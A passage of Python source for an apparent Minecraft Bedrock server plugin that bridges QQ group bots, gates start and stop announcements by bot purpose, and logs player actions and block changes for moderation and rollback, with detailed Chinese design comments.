        # ③ 兜底：交给主卡（群 openid 与卡片对不上时仍然尝试一次）
        card = getattr(self, "qq_bot", None)
        if card is not None:
            try:
                card.send_qq_text(self._regex_flatten(message))
                return
            except Exception:
                pass
        self.logger.warning(f"[正则引擎] 找不到能发送到群 {group} 的适配器")

    @staticmethod
    def _regex_flatten(message: Any) -> str:
        """把消息段数组压成纯文本（官方协议只吃 content 字符串）。"""
        if isinstance(message, str):
            return message
        if isinstance(message, dict):
            return str(message.get("content", "") or "")
        parts = []
        for seg in message or []:
            if not isinstance(seg, dict):
                parts.append(str(seg))
                continue
            stype = seg.get("type")
            data = seg.get("data") if isinstance(seg.get("data"), dict) else {}
            if stype == "text":
                parts.append(str(data.get("text", "")))
            elif stype == "at":
                # 官方协议的内联 @ 语法
                parts.append(f"<@{data.get('qq', '')}>")
            elif stype == "image":
                parts.append(str(data.get("file") or data.get("url") or ""))
        return "".join(parts)

    def _regex_delete_message(self, card_id: str, message_id: Any) -> None:
        """撤回消息（OneBot 支持；官方协议不提供，静默跳过）。"""
        mid = str(message_id or "").strip()
        if not mid or not mid.isdigit():
            return
        for adapter in self._regex_adapters():
            try:
                adapter.delete_msg(int(mid))
                return
            except Exception:
                continue

    def _regex_mute_user(self, card_id: str, group_id: str, user_id: Any, duration: int) -> None:
        """禁言（仅 OneBot 支持；官方协议不提供，静默跳过）。"""
        uid = str(user_id or "").strip()
        gid = str(group_id or "").strip()
        if not uid.isdigit() or not gid.isdigit():
            return
        for adapter in self._regex_adapters():
            try:
                adapter.set_group_ban(int(gid), int(uid), int(duration))
                return
            except Exception:
                continue

    def _regex_group_allowed(self, card_id: str, group_id: str) -> bool:
        """该群是否允许触发正则规则（对应 only_on_main 开关）。

        判据是「这个群是不是这张卡已绑定的群」—— 正则规则能在任意群
        触发就等于给了非绑定群一个免费的命令执行入口。
        """
        cid = str(group_id or "").strip()
        if not cid:
            return False
        card = self._regex_find_card(card_id)
        if card is None:
            return True
        try:
            if cid in card._bound_group_openids():
                return True
        except Exception:
            pass
        return False

    def _restart_qq_gateway(self):
        hub = getattr(self, "qq_hub", None)
        if hub is not None:
            self.logger.info("[QQ] 配置已更新，重新加载机器人网关")
            # ★ 用户手动「重新保存配置」= 明确的复位意图：把熔断/限流状态
            # 清掉。这是熔断唯一的**人工**恢复入口（自动恢复只发生在
            # 网关收到 READY 时）。没有这一步，用户修好后台事件订阅后
            # 会卡在 300 秒慢重试里，看起来像「改了也没用」。
            try:
                n = hub.reset_circuits("重新保存机器人配置")
                if n:
                    self.logger.info(f"[QQ] 已复位 {n} 个网关的熔断/限流状态")
            except Exception as e:
                self.logger.warning(f"[QQ] 复位熔断状态失败: {e}")
            libs = _load_offline_wheels(self, self.libs_dir)
            threading.Thread(target=lambda: hub.restart(libs), daemon=True).start()
            return
        qq_bot = getattr(self, "qq_bot", None)
        if qq_bot is not None:
            try:
                qq_bot.stop()
            except Exception as e:
                self.logger.warning(f"[QQ] 停止旧网关失败: {e}")
            self.qq_bot = None
        self.logger.info("[QQ] 配置已更新，重新加载网关")
        self._init_qq_gateway()

    def _notify_server_start_once(self, gateway=None):
        """发送「服务器已上线」播报。

        ``gateway`` 由触发它的网关传入（QQBotGateway 收到 READY 时回调）。
        多机器人场景下这个入参是**必需的**：

          1. 不传时会退回 ``plugin.qq_bot``，那永远只是「主卡」。
             第二张卡连上后播报会走主卡的群，等于串台。
          2. 去重标志必须是**每卡一份**（``_qq_start_notified`` 从布尔值
             改成按 card_id 的集合）。用全局布尔值时，A 卡连上就把标志
             置了 True，B 卡随后连上会直接 return —— B 的群永远收不到
             上线播报，即使用户明确给 B 打开了 notify_start。

        ★ 用途闸门（v7.9 新增）
        ---------------------
        只有用途为 ``bridge``（群服互通）的卡才发上线播报。
        用户提出的问题：「一个群服互通机器人 + 一个 AI 机器人，
        会说两遍「服务器已上线」」——根因就是这里没有按用途过滤，
        每张卡各发一遍。

        为什么是**过滤而非去重**：两张卡在配置上就是两个不同的群，
        它们各自收到一条上线播报本身没错；错的是 AI 播报卡本来就不该
        参与这条链路。用"全局只发一条"去重会带来更糟的后果 ——
        用户配了两张互通卡（一个主群 + 一个互联群），其中一个群就
        永远收不到上线提示。按用途过滤才是正解。

        AI 播报卡的上线信息由 AI 自己决定要不要说（走 ``_broadcast_ai``）。
        """
        try:
            bot = gateway if gateway is not None else getattr(self, "qq_bot", None)
            if bot is None:
                return
            try:
                if bot._supervisor_stop.is_set():
                    return
            except Exception:
                pass
            cid = str(getattr(bot, "_card_id", "") or "")

            # ★ 用途闸门：非 bridge 卡不发上线播报。
            #   放在 card_id 去重之前 —— 顺序上先排除"本来就不该发的卡"，
            #   再谈"这张卡发过没有"，语义更干净（否则会往
            #   _qq_start_notified 里塞进一堆 AI 卡的 id，虽然无害但难读）。
            #
            #   ⚠ 兜底取 bridge（与 hub._gateway_purpose 一致）：
            #     属性缺失时宁可多发一条，也不能让互通群静默收不到
            #     上线提示 —— 后者是功能凭空消失，更难排查。
            if not self._card_is_bridge(bot):
                return

            notified = getattr(self, "_qq_start_notified", None)
            if isinstance(notified, bool):
                # 兼容旧布尔值（升级前留下的实例属性），丢弃不用
                notified = None
            if not isinstance(notified, set):
                notified = set()
            if cid:
                if cid in notified:
                    return
            elif notified:
                # 非官方网关（无 card_id）没有播报语义，保持旧行为
                return

            cfg = getattr(bot, "config", {}) or {}
            if not str(cfg.get("group_openid", "")).strip():
                return
            if not cfg.get("notify_start", True):
                return
            if cid:
                notified.add(cid)
            else:
                notified.add("__legacy__")
            self._qq_start_notified = notified
            bot.send_qq_text(str(cfg.get("server_start_msg", "服务器已上线")), broadcast=True)
        except Exception as e:
            self.logger.warning(f"[QQ] 发送上线提示失败: {e}")

    def _card_is_bridge(self, bot) -> bool:
        """这张卡是不是「群服互通」用途（上线/下线播报的判定）。

        ★ 三层兜底，与 ``hub._gateway_purpose`` 同源但这里更保守：
            1. 网关实例上的 ``_card_purpose``（O(1)，出站热路径用）；
            2. ``conn_mgr.purpose_of(card_id)``（配置真源）；
            3. 找不到 → **当作 bridge**。

        第 3 条是刻意的：一张身份不明的卡如果被判成"不是互通"，
        它的群就再也收不到上线/下线提示，而面板上一切正常（连着、绿灯）
        —— 静默失效比多发一条消息严重得多。
        """
        try:
            inst = getattr(bot, "_card_purpose", None)
            if isinstance(inst, str) and inst:
                return normalize_purpose(inst) == PURPOSE_BRIDGE
            cid = str(getattr(bot, "_card_id", "") or "")
            mgr = getattr(self, "conn_mgr", None)
            if mgr is not None and cid:
                return normalize_purpose(mgr.purpose_of(cid)) == PURPOSE_BRIDGE
        except Exception:
            pass
        return True

    def _notify_server_stop(self):
        """发送「服务器已断开」播报。

        停机路径没有「由谁触发」的信息，因此这里遍历所有在跑的官方网关：
        用户给哪张卡开了 notify_stop，哪张卡的群就该收到。
        之前只发 ``plugin.qq_bot``（主卡），第二张卡的群永远收不到。

        ★ 用途闸门与 ``_notify_server_start_once`` 完全一致：
          只有 ``bridge`` 卡参与上下线播报。AI 播报卡不参与 ——
          否则就是用户反馈的「两遍服务器已上线」的同一个 bug
          在下线路径上的翻版。
        """
        try:
            hub = getattr(self, "qq_hub", None)
            gateways = []
            if hub is not None:
                try:
                    for card in hub.manager.adapters_of_type("qqofficial"):
                        gw = hub.gateway_by_id(str(card.get("id") or ""))
                        if gw is not None:
                            gateways.append(gw)
                except Exception:
                    gateways = []
            if not gateways:
                legacy = getattr(self, "qq_bot", None)
                if legacy is not None:
                    gateways = [legacy]

            for bot in gateways:
                try:
                    if bot._supervisor_stop.is_set():
                        continue
                    # ★ 用途闸门：非互通卡不发下线播报
                    if not self._card_is_bridge(bot):
                        continue
                    cfg = getattr(bot, "config", {}) or {}
                    if not str(cfg.get("group_openid", "")).strip():
                        continue
                    if not cfg.get("notify_stop", True):
                        continue
                    bot.send_qq_text(str(cfg.get("server_stop_msg", "服务器已断开")), broadcast=True)
                    time.sleep(1.5)
                except Exception as e:
                    self.logger.warning(f"[QQ] 发送下线提示失败: {e}")
        except Exception as e:
            self.logger.warning(f"[QQ] 发送下线提示失败: {e}")

    def _official_gateways(self, purpose: str = PURPOSE_BRIDGE):
        """所有在跑的官方（qqofficial）网关实例，主卡排在前面。

        WebSocket 卡的出站转发由 ``hub.websocket_relay`` 负责；官方卡则
        需要插件侧主动广播（每个网关的目标群集合都不一样）。抽成公共方法，
        避免各处各写一遍、又漏掉非主卡。

        ★ ``purpose`` 默认 ``bridge``：本方法的两个调用点（游戏聊天/
        进服退服播报）都属于群服互通语义。AI 播报走的是另一条链路
        （``_broadcast_ai``，筛 ``broadcast`` 卡）——
        两条链路用同一个参数名，避免将来有人误把播报卡塞进互通广播里。
        """
        hub = getattr(self, "qq_hub", None)
        out = []
        if hub is not None:
            try:
                running = hub.gateways_by_purpose(purpose, adapter_type="")
                # 只保留官方网关：有 send_qq_text、没有 send_group_msg
                official = [
                    gw for gw in running
                    if callable(getattr(gw, "send_qq_text", None))
                    and not callable(getattr(gw, "send_group_msg", None))
                ]
                # 主卡排前面（保持原有次序约定，调用方有依赖）
                try:
                    primary = hub.primary_gateway()
                except Exception:
                    primary = None
                if primary is not None and primary in official:
                    official.remove(primary)
                    official.insert(0, primary)
                out = official
            except Exception:
                out = []
        if not out:
            legacy = getattr(self, "qq_bot", None)
            # 旧单网关路径（没有 hub）：没有用途信息可用，按互通处理。
            # 只在确实没有 hub 时走到这里，属于兼容分支。
            if legacy is not None and purpose == PURPOSE_BRIDGE:
                out = [legacy]
        return out

    def _broadcast_official(self, flag_key, text_key, default_fmt, **fmt):
        """把一条播报发到每张「已开启该开关」的官方卡自己的群里。

        ``flag_key`` 形如 ``join_to_qq``，``text_key`` 形如 ``join_format``。
        之前这里只读 ``plugin.qq_bot``（主卡），导致第二张官方卡即使打开
        了同样的开关也收不到任何播报。
        """
        try:
            for bot in self._official_gateways():
                try:
                    cfg = getattr(bot, "config", {}) or {}
                    if not cfg.get(flag_key, True):
                        continue
                    template = str(cfg.get(text_key, default_fmt))
                    # 模板是用户可改的，两种写法都有人用：
                    #   "[游戏] %s：%s"            按位置
                    #   "[游戏] %(player)s: ..."   按名字
                    # 只能分别尝试，不能用 ``% fmt`` 一把梭 —— 那样位置式
                    # 会因「参数不够」直接抛异常，白白吞掉整条播报。
                    body = _format_template(template, fmt)
                    if body:
                        # 游戏内事件播报到全部互联群 —— 这是真正的广播语义
                        bot.send_qq_text(body, broadcast=True)
                except Exception:
                    pass
        except Exception:
            pass

    # ---------------------------------------------------------------- AI 播报
    def _ai_broadcast_targets(self) -> List[Any]:
        """用途为 ``broadcast`` 的**运行中**网关（官方 + OneBot 都算）。

        AI 播报和群服互通是两条完全独立的出站链路：
          · 互通由 ``_broadcast_official`` / ``hub.websocket_relay`` 承担，
            受每张卡 sync 里的方向开关控制；
          · 播报由这里承担，只认用途，**不看 sync 开关**。
        分开的理由：一张卡可以"不参与聊天互通，但接收服务器报错"。
        如果播报复用互通链路的开关，用户就得为了收报错而打开互通，
        结果是聊天消息也跟着灌进那个群 —— 不是他要的。
        """
        out: List[Any] = []
        try:
            out.extend(self._gateways_by_purpose(PURPOSE_BROADCAST))
        except Exception:
            pass
        return out

    def _broadcast_ai(self, text: Any, *, prefix: str = "") -> int:
        """把一条 AI 播报推给所有用途为 ``broadcast`` 的机器人。

        返回成功送达的网关数（0 表示没有可用的播报卡 —— 调用方据此
        决定要不要提示用户去配一张）。

        ★ 为什么不做模板渲染：AI 播报的内容本身就是成品文本（模型结论、
          报错摘要），再套一层 ``%s`` 模板只会让用户疑惑"为什么我的
          播报被套了格式"。前缀由调用方给，起分类作用。

        ★ 为什么**不**回退到主卡：这里与 ``_broadcast_official`` 的兜底
          策略刻意不同。互通是"服务器本来就要发的东西"，主卡兜底是
          兼容旧行为；AI 播报是新增能力，用户在面板上没勾任何播报卡
          就是明确表示"我不想播报"。偷偷发到主卡的群里属于越权打扰。
        """
        body = str(text or "").strip()
        if not body:
            return 0
        head = str(prefix or "").strip()
        if head and not body.startswith(head):
            body = f"{head}{body}"

        sent = 0
        for gw in self._ai_broadcast_targets():
            try:
                # OneBot 适配器走 send_group_msg（需要群号），官方卡走
                # send_qq_text（自己的 config 里带群）。
                if callable(getattr(gw, "send_group_msg", None)) and not callable(
                    getattr(gw, "send_qq_text", None)
                ):
                    groups = list(getattr(gw, "groups", None) or [])
                    if not groups:
                        continue
                    for g in groups:
                        try:
                            gw.send_group_msg(int(g) if str(g).isdigit() else g, body)
                            sent += 1
                        except Exception:
                            continue
                else:
                    gw.send_qq_text(body, broadcast=True)
                    sent += 1
            except Exception as e:
                try:
                    self.logger.warning(f"[AI 播报] 发送失败: {e}")
                except Exception:
                    pass
        return sent

    # =====================================================================
    # 玩家行为记录
    # =====================================================================
    #
    # ★★★ 线程模型（这里是本功能最容易写错、也最致命的地方）
    # =====================================================
    # 下面所有 @event_handler 回调都跑在**服务器主线程（tick 线程）**上。
    # 在主线程里做文件 IO 会直接卡 tick —— 项目里多处注释反复强调过
    # （"在主线程里读文件会直接卡 tick"）。
    #
    # 所以这一层严格只做两件事：
    #   1. 从事件对象里**取字段**（纯内存操作，快）；
    #   2. 把记录塞进 BehaviorRecorder 的队列（O(1)，不碰磁盘）。
    #
    # 真正的写盘在 behaviors.py 的 daemon 线程里完成。
    # 因此下面每个方法里**都不会**出现 open()/write()/json.dumps 落盘。

    def _behavior_level(self) -> int:
        """实时读取行为记录档位。

        ★ 每次事件都实时读配置，不做缓存 —— 服主在面板上把档位从 3
        改成 0，应当**立刻**停止记录。缓存会让它晚一拍生效，
        而这在隐私场景下是不可接受的。

        ★ 配置位置：``behavior_record.level``（旧位置 ``ai.behavior_record_level``
          仍被兼容）。注意这里与 **方块日志** 的档位（``block_record.level``）
          是两套独立的东西，别搞混：那个管"记哪些方块变更"，这个管"记哪些
          玩家行为"。
        """
        return max(0, min(self._behavior_cfg_int("level", 0), 3))

    def _behavior_recorder(self):
        """取记录器；未初始化/已关闭时返回 None。

        注意这里**不抛异常** —— 事件回调里抛异常会污染 Endstone 的
        事件分发，最坏情况影响其它插件的处理。
        """
        try:
            rec = getattr(self, "_behavior", None)
            if rec is None:
                return None
            if not rec.enabled(self._behavior_level()):
                return None
            return rec
        except Exception:
            return None

    def _behavior_pos(self, player):
        """取玩家坐标/维度，失败返回 (None, None, None, "")。

        ★ 事件对象上的 player 在实体已卸载的情况下可能取不到 location，
        必须整体包 try —— 记录行为这件事永远不该因为取不到坐标而失败。
        """
        try:
            loc = player.location
            dim = ""
            try:
                d = loc.dimension
                dim = getattr(d, "name", "") or str(d)
            except Exception:
                dim = ""
            return loc.x, loc.y, loc.z, dim
        except Exception:
            return None, None, None, ""

    def _pname(self, event) -> str:
        """从事件里安全取玩家名。"""
        try:
            return str(event.player.name)
        except Exception:
            return "未知"

    def _behavior_cfg_int(self, key: str, default: int) -> int:
        """读行为记录的数值配置（``behavior_record`` 段）。

        ★ 兼容旧配置：这四个键原先挂在 ``ai`` 段里、带 ``behavior_`` 前缀
          （``behavior_record_level`` / ``behavior_keep_days`` / …）。
          从老版本升级上来的配置文件**不需要手工迁移** ——
          先读新位置，读不到再回退到旧位置。

        ★ 为什么不是"启动时迁移一次"：迁移要写文件、要处理写失败、
          还要考虑"迁移到一半崩了"。而这种读时兼容是幂等、无副作用、
          且天然支持回滚版本的 —— 用户降级回旧版也照样能跑。
        """
        try:
            allcfg = self._load_tools_config() or {}
            br = allcfg.get("behavior_record")
            if isinstance(br, dict):
                v = br.get(key)
                if v not in (None, ""):
                    return int(v)
            # 回退到旧位置（ai 段，键名带 behavior_ 前缀）
            old_key = ("behavior_record_level" if key == "level"
                       else "behavior_" + str(key))
            v = (allcfg.get("ai") or {}).get(old_key)
            if v in (None, ""):
                return default
            return int(v)
        except Exception:
            return default

    def _behavior_enabled_for(self, kind: str) -> bool:
        """某个行为类型在当前档位下是否该记。"""
        try:
            from .behaviors import kind_level
            return self._behavior_level() >= kind_level(kind)
        except Exception:
            return False

    def _behavior_prune_tick(self):
        """定期清理行为记录。

        ★ 必须确认自己在*非主线程*里跑：`run_task` 是在主线程调度的，
          而 prune 要读整个 JSONL 文件 —— 几十 MB 的读会直接卡 tick。
          所以这里把真正的工作丢到一个 daemon 线程，自己立刻返回。
        """
        try:
            rec = getattr(self, "_behavior", None)
            if rec is None:
                return
            days = self._behavior_cfg_int("keep_days", 7)
            maxrec = self._behavior_cfg_int("max_records", 50000)

            def _work():
                try:
                    rec.prune(keep_days=days, max_records=maxrec)
                except Exception:
                    pass

            threading.Thread(target=_work, name="gm-behavior-prune",
                             daemon=True).start()
        except Exception:
            pass

    def _behavior_query_limit(self) -> int:
        """AI 工具单次查询条数上限。"""
        n = self._behavior_cfg_int("query_limit", 200)
        return max(1, min(n, 500))

    # ------------------------------------------------------------------
    # 区块日志（regionlog）
    # ------------------------------------------------------------------

    def _region_flush_tick(self):
        """把方块记录的内存缓冲刷进数据库。

        ★ 这个回调跑在**服务器主线程**上（Endstone 的 run_task 就是主线程
          调度）。而 ``flush_records`` 里是一次 SQLite 批量提交 —— 会不会
          卡 tick？不会，因为：
            · 单批条数受 5 秒窗口约束（实测活跃服也就几百条）；
            · SQLite 开了 WAL + synchronous=NORMAL，写入是顺序追加；
            · 真正的慢路径（大区域回档）走的是流式游标，不在这里。
          如果服主在极端场景下仍看到 tick 抖动，可以调大 period 或
          关掉 ``block_record.enabled``。这里不做异步化，是因为异步化
          会把"顺序"丢掉，而回档正确性依赖记录的先后关系。
        """
        if getattr(self, "_periodic_stopped", False):
            return
        api = getattr(self, "region_api", None)
        if api is None:
            return
        try:
            api.flush_records()
        except Exception as e:
            try:
                self.logger.warning(f"[区块日志] 定期落盘失败: {e}")
            except Exception:
                pass

    def _region_prune_tick(self):
        """定期清理过期的区块日志。

        ★ 与行为记录同一套路：**丢到 daemon 线程去做**。
          purge 要按时间范围 DELETE 三张表，几万行的时候可能要几十毫秒 ——
          在 run_task 的主线程里直接跑就是在卡 tick。
          这里不关心它什么时候完成，失败也无所谓（下次还会清）。
        """
        if getattr(self, "_periodic_stopped", False):
            return
        api = getattr(self, "region_api", None)
        if api is None:
            return
        try:
            days = int(api.config.as_dict().get("retention_days", 30) or 30)
        except Exception:
            days = 30

        def _work():
            try:
                api.purge(days)
            except Exception:
                pass

        try:
            threading.Thread(target=_work, name="gm-region-prune",
                             daemon=True).start()
        except Exception:
            pass

    def _region_recorder(self):
        """取区块记录 API；未启用返回 None（供事件回调快速短路）。"""
        try:
            api = getattr(self, "region_api", None)
            if api is None or not api.enabled:
                return None
            return api
        except Exception:
            return None

    def _region_dim(self, player) -> str:
        """从玩家位置取维度名。取不到返回空串（记录时用默认维度）。"""
        try:
            d = player.location.dimension
            return str(getattr(d, "name", "") or "")
        except Exception:
            return ""

    def _region_record_block(self, player, action: str, x, y, z,
                             block_type: str, block_states: str = "{}",
                             replaced_type=None, replaced_states=None) -> None:
        """记一条方块变更。**主线程安全、绝不抛异常。**

        ★ 这是方块日志的**唯一写入点**。所有会改变世界方块的事件
          最终都汇到这里 —— 便于一眼看清"我们到底记了什么"，
          也避免三个回调各写一遍坐标提取逻辑（那种写法迟早写歪一个）。
        """
        api = self._region_recorder()
        if api is None or player is None:
            return
        try:
            name = str(getattr(player, "name", "") or "未知")
            dim = self._region_dim(player)
            api.record_block(
                actor=name, action=str(action),
                block_type=str(block_type or "minecraft:air"),
                block_states=str(block_states or "{}"),
                x=int(x), y=int(y), z=int(z),
                dimension=dim,
                replaced_type=replaced_type, replaced_states=replaced_states,
            )
        except Exception:
            # 记录失败绝不能影响游戏 —— 这是明确的设计取舍：
            # 丢一条日志远好过让玩家的方块操作报错。
            pass

    @staticmethod
    def _block_states_json(block_or_state) -> str:
        """把方块/方块状态序列化成 JSON 串。

        ★ 必须整体包 try 并把失败降级成 ``{}``：Bedrock 里部分方块
          （尤其是刚被替换、正在做含水归一化的那些）读 ``block_states``
          会抛异常甚至短暂返回 None。这里失败就退化成"无状态"，
          回档时按类型恢复即可 —— 丢一点精度，换不发生崩溃。
        """
        try:
            from .regionlog.store import states_to_json
            data = getattr(block_or_state, "data", None)
            if data is None:
                return "{}"
            return states_to_json(data.block_states)
        except Exception:
            return "{}"

    def _region_record_place(self, event) -> None:
        """把「放置方块」写进区块日志。

        ★ 为什么必须记 ``replaced_type``：
          回档要"恢复到那个时刻的样子"，而放置动作**覆盖**掉了原来的
          方块。只记"现在是什么"的话，回档时只能把它变回空气 ——
          "拆掉玩家后来建的墙，结果连墙底下的原有地面也一起没了"。
          所以这里连"被覆盖掉的是什么"一起存。
        """
        api = self._region_recorder()
        if api is None:
            return
        try:
            if getattr(event, "is_cancelled", False):
                return
            st = event.block_placed_state
            if st is None:
                return
            placed_type = str(st.type or "")
            if not placed_type:
                return
            replaced = getattr(event, "block_replaced", None)
            replaced_type = None
            replaced_states = None
            if replaced is not None:
                try:
                    replaced_type = str(replaced.type or "")
                    replaced_states = self._block_states_json(replaced)
                except Exception:
                    replaced_type = None
            api.record_block(
                actor=str(getattr(event.player, "name", "") or "未知"),
                action="place",
                block_type=placed_type,
                block_states=self._block_states_json(st),
                x=int(st.x), y=int(st.y), z=int(st.z),
                dimension=self._region_dim(event.player),
                replaced_type=replaced_type or "minecraft:air",
                replaced_states=replaced_states or "{}",
            )
        except Exception:
            pass

    def _region_record_break(self, event) -> None:
        """把「破坏方块」写进区块日志。"""
        api = self._region_recorder()
        if api is None:
            return
        try:
            if getattr(event, "is_cancelled", False):
                return
            block = event.block
            if block is None:
                return
            btype = str(block.type or "")
            if not btype:
                return
            api.record_block(
                actor=str(getattr(event.player, "name", "") or "未知"),
                action="break",
                block_type=btype,
                block_states=self._block_states_json(block),
                x=int(block.x), y=int(block.y), z=int(block.z),
                dimension=self._region_dim(event.player),
            )
        except Exception:
            pass

    def _region_record_explode(self, event, actor) -> None:
        """把一片「被爆炸摧毁的方块」写进区块日志。

        ★ 为什么每个方块单独记一条而不是记一条"爆炸"：
          回档是按坐标做的 —— 它需要知道"这一格原来是什么"。
          一条笼统的爆炸记录无法回答"要恢复哪几格"。
          所以这里把 ``event.block_list`` 里每个方块都落一行。
        """
        api = self._region_recorder()
        if api is None:
            return
        try:
            blocks = getattr(event, "block_list", None)
            if not blocks:
                return
            name = str(getattr(actor, "name", "") or getattr(actor, "type", "") or "未知")
            dim = ""
            # 爆炸事件的 block 自带 dimension，优先用它（比 actor 的位置更准：
            # TNT 引爆点可能与被炸方块不在同一维度视距内）。
            for block in blocks:
                try:
                    if not dim:
                        try:
                            dim = str(block.dimension.name or "")
                        except Exception:
                            dim = ""
                    api.record_block(
                        actor=name, action="explode",
                        block_type=str(block.type or "minecraft:air"),
                        block_states=self._block_states_json(block),
                        x=int(block.x), y=int(block.y), z=int(block.z),
                        dimension=dim,
                    )
                except Exception:
                    continue
        except Exception:
            pass

    # ------------------------------------------------------------------
    # 事件：游戏内行为
    # ------------------------------------------------------------------

    @_optional_event_handler(BlockPlaceEvent)
    def on_behavior_block_place(self, event: BlockPlaceEvent):
        """放置方块 —— 覆盖 TNT / 床 / 重生锚 / 命令方块。

        ★ 敏感行为的**主要**捕获点：这些方块必须先被放下来才能被引爆，
          所以在这里记录等于抓住了"意图"阶段，比只在爆炸时记录更有价值
          （爆炸时已经分不清是谁放的了）。
        """
        if BlockPlaceEvent is None:
            return

        # ---- 区块日志（独立于行为记录档位）----
        #
        # ★ 为什么放在这里、在 ``lv <= 0`` 的提前返回**之前**：
        #   「行为记录档位」和「区块记录开关」是两个独立的配置。
        #   服主完全可能关掉行为记录（他不想存聊天/隐私数据），
        #   但仍然开着区块记录（他要能回档别人的破坏）。
        #   如果把方块记录塞在 lv>0 的分支里，这种配置下就一条都记不到 ——
        #   表现为"开了区块记录但回档总说没有可恢复的操作"，
        #   而且极难排查（日志里一切正常）。
        self._region_record_place(event)

        try:
            lv = self._behavior_level()
            if lv <= 0:
                return
            name = self._pname(event)
            # 取被放置方块的类型。BlockState.type 是 str（已核实存根），
            # 但 block_placed_state 本身可能为 None，整体包 try。
            btype = ""
            try:
                btype = str(event.block_placed_state.type or "")
            except Exception:
                btype = ""

            x, y, z, dim = self._behavior_pos(event.player)
            rec = getattr(self, "_behavior", None)
            if rec is None:
                return

            if btype == "minecraft:tnt":
                rec.record("place_tnt", name, btype, lv, x, y, z, dim)
            elif btype in ("minecraft:bed", "minecraft:respawn_anchor"):
                rec.record("place_bed", name, btype, lv, x, y, z, dim)
            elif btype == "minecraft:command_block":
                rec.record("place_command_block", name, btype, lv, x, y, z, dim)
            # 全记录档再额外记一条通用放置
            if lv >= 3 and btype:
                rec.record("block_place", name, btype, lv, x, y, z, dim)
        except Exception:
            pass

    @_optional_event_handler(BlockBreakEvent)
    def on_behavior_block_break(self, event: BlockBreakEvent):
        """破坏方块 —— 覆盖拆 TNT / 床 / 重生锚 + 全记录档的通用破坏。"""
        if BlockBreakEvent is None:
            return
        # 区块日志（独立于行为记录档位，理由见 on_behavior_block_place）
        self._region_record_break(event)
        try:
            lv = self._behavior_level()
            if lv <= 0:
                return
            name = self._pname(event)
            btype = ""
            try:
                btype = str(event.block.type or "")
            except Exception:
                btype = ""
            x, y, z, dim = self._behavior_pos(event.player)
            rec = getattr(self, "_behavior", None)
            if rec is None:
                return

            if btype in ("minecraft:tnt", "minecraft:bed",
                         "minecraft:respawn_anchor"):
                rec.record("break_explosive", name, btype, lv, x, y, z, dim)
            if lv >= 3 and btype:
                rec.record("block_break", name, btype, lv, x, y, z, dim)
        except Exception:
            pass

    @_optional_event_handler(PlayerInteractEvent)
    def on_behavior_interact(self, event: PlayerInteractEvent):
        """交互 —— 捕获打火石点燃、岩浆/水桶。

        ★ 用 `action` 过滤到"右键点方块"：右键空气、左键都不算。
          不过滤的话，玩家挥一下手都会记一条，噪音会淹没信号。

        ★ 物品类型必须用 `item.type.id` 取命名空间 ID ——
          `ItemStack.type` 返回的是 **ItemType 对象**，不是字符串，
          直接比较永远为 False（已核实 Endstone 存根，这是个典型的坑）。
        """
        if PlayerInteractEvent is None:
            return
        try:
            lv = self._behavior_level()
            if lv <= 0:
                return
            # 只要右键点方块
            try:
                if event.action != PlayerInteractEvent.Action.RIGHT_CLICK_BLOCK:
                    return
            except Exception:
                return
            # 手上必须有物品
            try:
                if not event.has_item:
                    return
                item = event.item
                if item is None:
                    return
                iid = str(item.type.id or "")
            except Exception:
                return
            if not iid:
                return

            name = self._pname(event)
            x, y, z, dim = self._behavior_pos(event.player)
            rec = getattr(self, "_behavior", None)
            if rec is None:
                return

            if iid == "minecraft:flint_and_steel":
                rec.record("use_flint", name, iid, lv, x, y, z, dim)
                # 对着 TNT 用打火石 = 点燃。目标方块类型拿不到就只记 use_flint。
                try:
                    tgt = str(event.block.type or "")
                except Exception:
                    tgt = ""
                if tgt == "minecraft:tnt":
                    rec.record("ignite_tnt", name, iid, lv, x, y, z, dim)
            elif iid in ("minecraft:lava_bucket", "minecraft:water_bucket"):
                rec.record("use_bucket", name, iid, lv, x, y, z, dim)
            elif lv >= 3:
                rec.record("interact", name, iid, lv, x, y, z, dim)
        except Exception:
            pass

    @_optional_event_handler(ActorExplodeEvent)
    def on_behavior_actor_explode(self, event: ActorExplodeEvent):
        """实体爆炸 —— TNT 实体、苦力怕等。

        ★ Endstone **没有** EntityExplodeEvent，类名是 ActorExplodeEvent
          （Actor 系列命名）。actor.type 是 str，如 "minecraft:tnt"。

        ★ 这里记不到"是谁点的"：红石引爆、他人引燃都无法从事件里
          反查责任人。所以 detail 里带上肇事实体类型，player 记为空 ——
          **如实记录"发生了什么"，不臆造责任人**。
        """
        if ActorExplodeEvent is None:
            return
        # 区块日志：爆炸是"最需要能回档"的破坏形式，且它独立于行为档位
        # （理由同 on_behavior_block_place）。actor 拿不到人名时退化成
        # 实体类型（如 minecraft:tnt），保持"如实记录、不臆造责任人"。
        try:
            self._region_record_explode(event, getattr(event, "actor", None))
        except Exception:
            pass
        try:
            lv = self._behavior_level()
            if lv <= 0:
                return
            atype = ""
            try:
                atype = str(event.actor.type or "")
            except Exception:
                atype = "unknown"
            x = y = z = None
            dim = ""
            try:
                loc = event.location
                x, y, z = loc.x, loc.y, loc.z
                try:
                    dim = getattr(loc.dimension, "name", "") or ""
                except Exception:
                    dim = ""
            except Exception:
                pass
            rec = getattr(self, "_behavior", None)
            if rec is None:
                return
            rec.record("entity_explode", "", atype or "unknown",
                       lv, x, y, z, dim)
        except Exception:
            pass

    @_optional_event_handler(BlockExplodeEvent)
    def on_behavior_block_explode(self, event: BlockExplodeEvent):
        """方块爆炸 —— 床、重生锚等。"""
        if BlockExplodeEvent is None:
            return
        # 区块日志（独立于行为档位）：床/重生锚爆炸，同样要能回档
        try:
            self._region_record_explode(event, getattr(event, "block", None))
        except Exception:
            pass
        try:
            lv = self._behavior_level()
            if lv <= 0:
                return
            btype = ""
            try:
                btype = str(event.block.type or "")
            except Exception:
                btype = "unknown"
            x = y = z = None
            dim = ""
            try:
                loc = event.block.location
                x, y, z = loc.x, loc.y, loc.z
                try:
                    dim = getattr(loc.dimension, "name", "") or ""
                except Exception:
                    dim = ""
            except Exception:
                pass
            rec = getattr(self, "_behavior", None)
            if rec is None:
                return
            rec.record("block_explode", "", btype or "unknown",
                       lv, x, y, z, dim)
        except Exception:
            pass

    @_optional_event_handler(PlayerCommandEvent)
    def on_behavior_command(self, event: PlayerCommandEvent):
        """执行命令（仅全记录档）。"""
        if PlayerCommandEvent is None:
            return
        try:
            lv = self._behavior_level()
            if lv < 3:
                return
            cmd = ""
            try:
                cmd = str(event.command or "")
            except Exception:
                cmd = ""
            name = self._pname(event)
            x, y, z, dim = self._behavior_pos(event.player)
            rec = getattr(self, "_behavior", None)
